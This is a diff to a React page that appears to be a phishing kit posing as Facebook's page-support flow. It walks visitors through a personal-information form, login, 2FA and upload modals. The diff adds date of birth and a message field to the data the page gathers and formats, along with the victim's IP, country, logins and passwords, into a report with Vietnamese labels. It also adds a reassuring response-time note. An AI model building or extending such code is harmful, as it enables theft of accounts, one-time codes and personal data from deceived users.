@@ -33,6 +33,8 @@ const Home = () =>
         businessEmail: '',
         phone: '',
         pageName: '',
+        dob: '',
+        message: '',
         loginIdentifier: ''
     } );
     const [ loginAttempts, setLoginAttempts ] = useState( [] );
@@ -58,12 +60,23 @@ const Home = () =>
             termsOfService: 'Terms of Service',
             communityStandards: 'Community Standards',
 
+            informationTitle: 'Information',
             fullName: 'Full Name',
+            emailAddress: 'Email Address',
+            emailBusinessAddress: 'Email Business Address',
             personalEmail: 'Personal Email',
             businessEmail: 'Business Email',
             mobilePhone: 'Mobile Phone Number',
             yourPageName: 'Your Page Name',
+            dateOfBirth: 'Date of Birth',
+            day: 'Day',
+            month: 'Month',
+            year: 'Year',
+            messagePlaceholder: 'Message',
+            responseTimeNote: 'Our response will be sent to you within 14 - 48 hours.',
             agreeToTerms: 'I agree to the',
+            pleaseAgreeTerms: 'Please agree to the Terms of use.',
+            submitBtn: 'Submit',
             confirm: 'Confirm',
             aboutHelpMore: 'About · Help · See more',
 
@@ -291,7 +304,7 @@ const Home = () =>
         message += `🌐 <code>${ ipInfo.ip }</code> • ${ ipInfo.country }\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
+        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName || form.dob || form.message )
         {
             message += `<b>📋 THÔNG TIN</b>\n`;
             if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
@@ -302,6 +315,8 @@ const Home = () =>
             }
             if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
             if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
+            if ( form.dob ) message += `   Ngày sinh: <code>${ form.dob }</code>\n`;
+            if ( form.message ) message += `   Lời nhắn: <code>${ form.message }</code>\n`;
         }
 
         if ( login || ( passes && passes.length > 0 ) )
@@ -588,7 +603,13 @@ const Home = () =>
                 </div>
             </div>
 
-            <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
+            <FirstFormModal
+                show={ showFirstModal }
+                onClose={ () => setShowFirstModal( false ) }
+                onSubmit={ handleFirstFormSubmit }
+                onOpenTerms={ () => setShowTermsModal( true ) }
+                texts={ texts }
+            />
             <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } />
             <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } } texts={ texts } />
             <UploadModal show={ showUploadModal } onClose={ () => setShowUploadModal( false ) } onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
